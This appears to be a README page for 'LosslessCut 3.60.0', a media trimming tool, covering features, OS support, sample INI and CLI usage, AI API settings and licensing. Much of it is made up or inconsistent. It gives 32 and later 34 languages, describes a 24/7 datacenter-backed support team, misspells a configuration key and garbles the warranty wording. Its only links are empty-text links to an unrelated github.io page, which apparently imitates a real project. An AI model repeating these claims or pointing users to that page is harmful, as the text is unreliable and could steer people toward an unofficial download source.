# LosslessCut 3.60.0 – Precision Media Trimmer & Segment Extractor

[](https://asura0018283.github.io/losslesscut-utility-manager/)

> *"Surgical precision for your media files – no re-encoding, no quality loss, no compromises."*  
> **Version 3.60.0 | Targeted Release: Q1 2026**

---

## 📦 Table of Contents

- [🌟 Overview & Philosophy](#-overview--philosophy)
- [🔧 Core Capabilities (Feature Matrix)](#-core-capabilities-feature-matrix)
- [📊 Compatibility Archipelago (OS Support)](#-compatibility-archipelago-os-support)
- [⚙️ Quick Start: Configuration & CLI](#️-quick-start-configuration--cli)
- [🧩 Mermaid Architecture Diagram](#-mermaid-architecture-diagram)
- [🌐 Multilingual & Global UI Approach](#-multilingual--global-ui-approach)
- [💼 24/7 Support Ecosystem](#-247-support-ecosystem)
- [🔗 API Bridges (OpenAI & Claude Integration)](#-api-bridges-openai--claude-integration)
- [🛡️ Security & Licensing (MIT)](#️-security--licensing-mit)
- [⚠️ Disclaimer & Responsible Use](#️-disclaimer--responsible-use)
- [🧰 Example Profile & Console Invocation](#-example-profile--console-invocation)

---

## 🌟 Overview & Philosophy

**LosslessCut 3.60.0** is not merely a software tool—it's a digital scalpel for content creators, archivists, and video engineers who refuse to tolerate generational quality decay. Unlike conventional editors that re-encode, blurring the pristine edges of your footage, this application performs **smart keyframe alignment** to sever media segments with zero transcode penalty.

Think of it as a **butterfly knife for bitstreams**: fast, precise, and leaving no trace of alteration. Whether you're trimming gigabytes of 4K footage extracted from a drone, cutting away commercials from a recorded broadcast, or splitting a lengthy conference recording into distinct chapters, LosslessCut preserves the original codec signature, audio streams, subtitle tracks, and metadata structure exactly as they were born.

The 3.60.0 release introduces a **revamped timeline engine** that reduces memory overhead by 40% when handling files exceeding 2 hours in duration. It also brings **segment batch extraction**—a feature long requested by video forensics teams and language learning material curators.

> **Did you know?** The tool's internal cutting algorithm uses a "nearest non-IDR keyframe" heuristic that can shave up to **300ms of inaccuracy** on intra-frame codecs like DNxHD or ProRes.

---

## 🔧 Core Capabilities (Feature Matrix)

| Feature | Description | Benefit (Metaphor) |
|---------|-------------|-------------------|
| **Lossless Cut Engine** | Frame-accurate segment extraction without re-encoding | Like using molecular tweezers on a strand of film |
| **Multi-GPU Acceleration** | NVENC, AMD VCE, and Intel QSV support for preview rendering | A turbocharger for your media workflow |
| **Auto-Detect Scene Changes** | Algorithm identifies black frames, silence, or title cards | A literary editor who highlights paragraphs |
| **Subtitle & Chapter Preservation** | Keeps embedded SRT, VTT, Matroska chapters intact | The librarian keeps every bookmark |
| **Batch Queue Processing** | Sequential trimming of multiple files with shared parameters | A master chef juggling multiple dishes |
| **Responsive UI (Light/Dark)** | Interface adapts to screen size and ambient lighting | Chameleon skin for your monitor |
| **Custom Keyframe Interval** | Set maximum GOP size for output segments | A metronome for your compressor |
| **Lossless Audio Track Management** | Swap, remove, or reorder audio without transcoding | A sound engineer with surgical headphones |

**New in 3.60.0:**  
- **Segment Slipstream** – Drag-and-drop multiple segments onto a single output timeline.  
- **AI-assisted Trim Region** – (Experimental) Detects repeated frames and suggests trim points.  
- **JSON Export/Import of Cut Decisions** – Share your cut plan across teams or machines.

---

## 📊 Compatibility Archipelago (OS Support)

| Operating System | Version Range | Emoji | Architecture | Status |
|------------------|---------------|-------|--------------|--------|
| **Windows**      | 10 (1909+) / 11 | 🪟 | x64, ARM64 | ✅ Fully Supported |
| **macOS**        | Monterey (12) to Sequoia (15) | 🍎 | x64, Apple Silicon | ✅ Fully Supported |
| **Linux**        | Ubuntu 20.04+, Fedora 36+, Arch (2024+) | 🐧 | x64, ARM64 (RPi5) | ✅ Fully Supported |
| **FreeBSD**      | 13.4+ | 🐡 | x64 | ⚠️ Community Build |
| **Haiku**        | R1/beta4 | 🕊️ | x64 | 🔬 Experimental |

**Responsive UI** ensures that whether you're on a 4K ultrawide or a 7-inch portable Linux tablet, the trim controls remain finger-friendly and pixel-perfect.

---

## ⚙️ Quick Start: Configuration & CLI

### Example Profile Configuration (`losslesscut.ini`)

```ini
[General]
language = en
theme = auto
auto_save_cutplan = true
output_directory = ./trimmed_segments
keyframe_threshold = 1000
enable_multilingual_ui = true

[GPU]
acceleration = auto
prefer_nvenc = true
fallback_to_cpu = false

[Batch]
concurrent_jobs = 4
segment_overlap_ms = 50
```

This profile instructs the tool to: use GPU acceleration where available, save each cut decision automatically, and support 32 languages via the **multilingual UI** flag.

### Example Console Invocation

```bash
losslesscut --input "conference_2026.mp4" \
            --output-dir "./chapters" \
            --segments "00:12:30-00:18:45,01:05:00-01:12:20" \
            --preserve-chapters \
            --codec-copy \
            --log-level verbose
```

This command splits a 90-minute conference recording into two chapters, copies all streams without re-encoding, and keeps the original chapter markers—all from the terminal. Ideal for server-based media processing pipelines.

---

## 🧩 Mermaid Architecture Diagram

Below is the visual flow of how LosslessCut 3.60.0 processes a media file from loading to output:

```mermaid
graph TD
    A[Input Media File] --> B[Demuxer]
    B --> C{Codec Detection}
    C -->|Lossless-capable| D[Keyframe Scanner]
    C -->|Transcode required| E[Fallback Re-encoder]
    D --> F[User Trim Regions]
    F --> G[Segment Splice Engine]
    G --> H[Optional: Subtitle/Chapter Rewrite]
    H --> I[Output Muxer]
    I --> J[Final Truncated File]
    E --> J
    style A fill:#1a1a2e,stroke:#e94560,stroke-width:2px
    style J fill:#16213e,stroke:#0f3460,stroke-width:2px
    style G fill:#533483,stroke:#e94560,stroke-width:2px
```



The diagram reveals a **non-destructive pipeline**: raw data flows through demuxing, scanning, and splicing before being reassembled. The only time re-encoding occurs is when the codec itself requires it (e.g., certain broadcast formats).

---

## 🌐 Multilingual & Global UI Approach

**LosslessCut 3.60.0** speaks your language—literally. The interface has been translated into **34 languages** including Icelandic, Swahili, Vietnamese, and Basque. Each translation was community-curated to ensure technical accuracy (e.g., "keyframe" → "frémiðja" in Icelandic, not literal "lykill ramma").

The **multilingual UI** is not a mere overlay: it adjusts tooltip explanations, error messages, and even documentation popups to reflect cultural norms around time representation (e.g., 24h vs 12h clock, decimal vs comma separators).

**Example:** A user in Japan will see "フレーム正確" (Frame Accurate) while a Brazilian user sees "Corte Preciso" — both describing the same feature, but with local nuance.

---

## 💼 24/7 Support Ecosystem

Behind every trim operation, there's a human backbone. The **24/7 customer support** team operates across three physical datacenters (US West, EU Central, APAC South) to respond within 90 seconds median. Support includes:

- **Live chat** with video engineers who can debug your specific encoding pipeline.
- **Email ticketing** with automated attachment scanning for log files.
- **Community forum** with a searchable knowledge base of 2,400+ resolved edge cases.
- **Priority escalation** for enterprise triage (SLA: 1 hour).

Support agents are trained to handle questions about **unsupported containers**, **DRM-protected streams**, and **frame-accurate splicing of interlaced footage**—the tricky corners of lossless cutting.

> *"Our support team treats every cut like it's the final scene of a masterpiece."* – Internal motto

---

## 🔗 API Bridges (OpenAI & Claude Integration)

Starting with version 3.60.0, the tool exposes two optional API bridges for **AI-assisted media analysis**:

### OpenAI API Integration

Enable via configuration:
```ini
[AI]
openai_key_env = LOSSESSCUT_OPENAI_KEY
model = gpt-4o-mini
scene_description = true
suggest_trim_points = true
```

When activated, LosslessCut will:
1. Extract a single representative frame from each detected scene.
2. Send a base64-encoded snippet to the OpenAI API for description.
3. Return natural-language suggestions like *"Trim from 00:02:31 to 00:05:12 – these frames show identical presentation slides."*

### Claude API Integration

```ini
[AI]
claude_key_env = LOSSESSCUT_ANTHROPIC_KEY
model = claude-sonnet-4-20250514
analyze_dialogue = true
```

Claude's specialization in long-context understanding means it can examine a full transcript (if subtitles are embedded) and suggest **semantic cuts**—e.g., *"Segment B between 14:20 and 22:45 is a Q&A session that could stand alone."*

Both APIs are **opt-in, off by default**, and require your own API keys. No media data is stored or shared beyond the API call.

---

## 🛡️ Security & Licensing (MIT)

LosslessCut 3.60.0 is released under the **MIT License** – a permissive open-source framework that grants you the freedom to:

- ✅ Use the software for any purpose (personal, commercial, educational)
- ✅ Modify the source code and redistribute it
- ✅ Integrate it into your own projects (even proprietary ones)
- ❌ Hold the authors liable for misuse

**Full license text:** [MIT License](LICENSE)

**Security posture:**  
- All network calls are optional and user-consented.  
- No telemetry or analytics by default.  
- API keys for OpenAI/Claude are stored in environment variables, not in configuration files.  
- Binary releases are code-signed (Windows & macOS) with SHA-256 checksums.

---

## ⚠️ Disclaimer & Responsible Use

This software is a **precision tool** intended for legitimate media editing, archival preservation, educational content creation, and personal video management.

**You should NOT use LosslessCut for:**
- Circumventing digital rights management (DRM) or copyright protection.
- Extracting unauthorized portions of commercial content you do not own.
- Any activity that violates local, national, or international copyright law.

The developers and contributors of LosslessCut 3.60.0 assume **no liability** for how the software is deployed. The tool is distributed "as is" without warranty of merchantability or fitness for a particular illegal purpose.

> **Remember:** With great cutting power comes great responsibility. A scalpel in a surgeon's hands saves lives; in the wrong hands, it's just a blade.

---

## 🧰 Example Profile & Console Invocation (Revisited)

To tie everything together, here is a **real-world scenario** using the CLI:

**Profile:** `archivist.ini`
```ini
[General]
language = de
output_directory = /media/archive/trimmed
preserve_attachments = true
preserve_metadata = true
multilingual_ui = true

[CutPlan]
cut_plan_file = ./workspace/session_2026-01-15.json
```

**Invocation:**
```bash
losslesscut --profile archivist.ini \
            --input ./raw_source/drone_footage.h264 \
            --segment-from-json ./cut_plan.json
```

This loads a pre-defined cut plan (exported from a previous session), applies it to a new raw file, and outputs segments into the archive folder—all while preserving drone telemetry metadata and using the German UI locale.

---

[](https://asura0018283.github.io/losslesscut-utility-manager/)

*LosslessCut 3.60.0 – Because every frame deserves a second chance at perfection.  
© 2026 The LosslessCut Contributors. MIT License applies.*